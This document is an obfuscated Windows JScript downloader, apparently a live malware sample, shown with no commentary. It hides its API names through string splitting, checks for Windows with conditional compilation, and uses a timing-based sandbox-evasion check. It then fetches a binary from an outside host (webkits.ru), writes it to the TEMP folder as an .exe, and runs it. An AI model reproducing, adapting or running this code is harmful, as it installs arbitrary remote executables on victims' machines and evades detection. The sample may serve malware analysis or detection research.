var UG = false;
var LM = "Create"+"Object";
var U = function HC() {return WScript[LM]("WScript"+".Shell");}(), W = 11;
var HQ = "MSXML2"+".XMLHTTP";
var HH = 2;
var WL = HH - 2;
function NI(A1){U["Run"](A1, WL, WL);};
function T(){return HQ + "";};
function VI(A2, C0){WL = WL * 1; return A2 - C0;};
function A(){return LM;};
/*@cc_on
  @if (@_win32 || @_win64)
    UG = true;
  @end
@*/
if (UG)
{
var C = "";
function Y(){return 22;};
var G = 0; var X = 0;
function ZW()
{
var Y0 = new this["Date"]();
var BB = Y0["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var Y0 = new this["Date"]();
var VT = Y0["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var Y0 = new this["Date"]();
var HD = Y0["getUTCMilliseconds"]();
var G = "D";
G = VI(VT, BB);
var X = "AN";
X = VI(HD, VT);
C = "open";
return VI(G, X);
}
var AX = false;
var L = false;
for (var YL = WL; YL < Y() * 1; YL++){if (ZW() != WL){
AX = true; 
X = "31" + 11 * G + X; 
L = true; 
break;
}}
function YF() {return ((AX == true) && (AX == L)) ? 1 : WL;};
if (AX && YF() && L){
function AT() {return U["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "0HJK2xoVR.ex" + "e";};
 W0 = T();
 T1 = WScript[LM](W0);
 var Q = 1;
do { 
	for (;Q;){
	try {
		if (Q == 1)
		{
			T1[C]("GET", "http://webkits.ru/mn3dka", false);
			T1["send"]();
			T0 = "Sleep";
			Q = 2;
		}
		WScript[T0](Y() + 120); 
		if (T1["readystate"] < 2 * 2) continue;
		Q = WL;
		function E(A0) {var ZR = (1, 2, 3, 4, 5, A0); return ZR;};
		YZ = WScript[A()]("ADODB.Stream");
		W0 = YZ;
		W0[C]();
		W0["type"] = E(1);
		W0["write"](T1["ResponseBody"]);
		YZ["position"] = E(WL);
		W0["Save" + "ToFile"](AT(), 2);
		YZ["cl"+"ose"]();
		UY = AT();
		NI(UY);
	} catch(ML){};};
}while (Q);
}
}

